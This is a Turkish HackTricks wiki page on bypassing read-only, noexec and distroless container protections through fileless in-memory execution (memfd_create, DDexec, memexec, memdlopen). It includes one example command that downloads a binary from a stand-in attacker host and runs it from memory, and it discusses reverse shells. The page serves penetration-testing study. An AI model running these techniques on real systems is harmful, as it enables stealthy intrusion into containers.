# FS protections atlatma: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha ayrıntılı açıklamalarını bulabilirsiniz:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Gizlilik ve Kaçınma için Linux Bellek Manipülasyonunu İnceleme**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**DDexec-ng ve bellek içi dlopen() ile gizli saldırılar - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec senaryosu

Bir container içinde, security context'e **`readOnlyRootFilesystem: true`** ayarlanarak root filesystem'ı read-only olarak mount edebilirsiniz.<sup>[[3]](#references)</sup> Örneğin:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only bir root, ayrı olarak mount edilmiş volume'ları read-only yapmaz. Docker, **`/dev/shm`** yolunu bir IPC mount'u olarak ele alırken, `rw` ve `noexec` gibi tmpfs seçenekleri runtime configuration tercihleridir; bu davranışlardan herhangi birine güvenmeden önce hedef container'ın mount seçeneklerini inceleyin.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Bir red-team perspektifinden bakıldığında bu kombinasyon, halihazırda mevcut olmayan binary'leri (örneğin backdoor'ları veya enumeration araçlarını) indirmeyi ve çalıştırmayı zorlaştırabilir.<sup>[[4]](#references)[[5]](#references)</sup>

## En kolay bypass: Scripts

Bir `noexec` mount'u, bu mount üzerindeki binary'lerin doğrudan çalıştırılmasını engeller; ancak bir interpreter yine de bir script'i okuyup yorumlayabilir. Bu nedenle `sh` veya `python` mevcutsa bir shell ya da Python script'ini ilgili interpreter üzerinden çalıştırabilirsiniz.<sup>[[5]](#references)</sup>

Gerekli tool'un kendisi bir binary olduğunda bu yöntem işe yaramaz.<sup>[[5]](#references)</sup>

## Memory Bypasses

Bir mount edilmiş path üzerinden doğrudan çalıştırma engellendiğinde, seçeneklerden biri ELF'yi belleğe yüklemek ve bellek içi bir path üzerinden çalıştırmaktır. Bu, o mount üzerindeki `noexec` kontrolünden kaçınır; ancak diğer kernel, permission veya policy kontrollerini ortadan kaldırmaz.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Bir scripting runtime ilgili Linux interface'ine erişebiliyorsa, **`memfd_create(2)`** ile anonim ve RAM-backed bir file descriptor oluşturabilir, ELF byte'larını buna yazabilir ve fd-backed bir execution path kullanabilir. [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesi bu workflow için sıkıştırılmış ve base64-encoded Python, Perl veya Ruby code üretir.<sup>[[6]](#references)[[7]](#references)</sup>

Proje şu anda Python, Perl ve Ruby target'larını belgeliyor; PHP veya Node için farklı bir runtime-specific teknik ya da extension gerekir. Bu nedenle bir dil için bu generator'ın bulunmaması, bellek içi execution'ın imkansız olduğu anlamına gelmez.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`** içine yazılan normal bir executable, bu mount'un **`noexec`** ayarına tabi olmaya devam eder; yalnızca onu ordinary bir file descriptor üzerinden açmak mount policy'sini değiştirmez.<sup>[[5]](#references)</sup>
>
> Bellek içi execution'ın kesin yöntemi ayrıca runtime'a, architecture'a, kernel'e ve mevcut permission'lara bağlıdır.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), **`/proc/self/mem`** üzerinden çalışan shell process'ine bir stager ve loader yazar, ardından control'ü bu code'a aktarır.<sup>[[8]](#references)</sup>

Bu, process'in söz konusu binary'yi öncelikle executable bir filesystem üzerine yerleştirmeden yüklemesini sağlar.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec**, shellcode'u veya bir binary'yi **memory** üzerinden yükleyip **execute** edebilir.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Bu teknik hakkında daha fazla bilgi için Github'a veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), daemon olarak çalışan bir DDexec uygulamasıdır. Daemon, argümanları ve ham program byte'larını içeren istekleri dinler, her programı yükleyip çalıştırmak için bir child process oluşturur ve parent process'i server olarak tutar.<sup>[[9]](#references)</sup>

Repository, [a.php](https://github.com/arget13/memexec/blob/main/a.php) içinde **memexec kullanarak bir PHP reverse shell üzerinden binary'leri çalıştırma** örneğini içerir.<sup>[[9]](#references)</sup>

### Memdlopen

DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen), bir shared object veya program için fileless `dlopen()` uygulamasıdır. README şu anda ARM64 desteğini belgeliyor; bu nedenle kullanmadan önce hedef architecture'u kontrol edin.<sup>[[10]](#references)</sup>

## Distroless Bypass

**Distroless'in gerçekte ne olduğu**, ne zaman yardımcı olduğu, ne zaman olmadığı ve container'larda post-exploitation tradecraft'ını nasıl değiştirdiğine dair özel bir açıklama için şuraya bakın:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless nedir

Distroless image'ları yalnızca uygulamayı ve runtime dependencies'larını içerir; official image'lar package manager'ları, shell'leri ve standart bir Linux distribution'ında bulunması beklenen diğer programları içermez.<sup>[[11]](#references)</sup>

Runtime image'ını bu dependencies ile sınırlamak, production'da bulunan software miktarını ve scan edilip takip edilmesi gereken unsurların sayısını azaltır.<sup>[[11]](#references)</sup>

### Reverse Shell

Bir distroless container'da normal bir shell için **`sh` veya `bash`** bulamayabileceğiniz gibi `ls`, `whoami` veya `id` gibi yaygın utility'leri de bulamayabilirsiniz.<sup>[[11]](#references)</sup>

> [!WARNING]
> Bu nedenle, normal shell tabanlı bir reverse shell veya utility tabanlı enumeration çalışmayabilir.<sup>[[11]](#references)</sup>

Compromised application bir language runtime içeriyorsa (örneğin bir Flask application için Python veya bir Node application için Node.js), bir RCE yine de bu runtime'ı command channel ve API'leri üzerinden system inspection için kullanabilir.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Language capabilities'lerini kullanarak **system'i enumerate etmek** için mevcut scripting language'i kullanın.<sup>[[12]](#references)</sup>

Herhangi bir **read-only/no-exec** protection yoksa bir command channel, writable ve executable bir mount'a binary'ler yazıp bunları çalıştırabilir; önce mount options'larını ve permissions'ları doğrulayın.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Bu protections mevcut olduğunda, runtime, kernel ve permissions izin verdiği ölçüde yukarıdaki **memory-execution techniques**'lerini kullanın.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE vulnerabilities'lerini exploit ederek scripting-language **reverse shell** elde etme ve memory'den binary çalıştırma **examples**'larını [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) içinde bulabilirsiniz.<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Stealth ve Evasion için Linux Memory Manipulation'ı İncelemek](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng ve in-memory dlopen() ile Stealth Intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Bir Pod veya Container için Security Context Yapılandırma](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
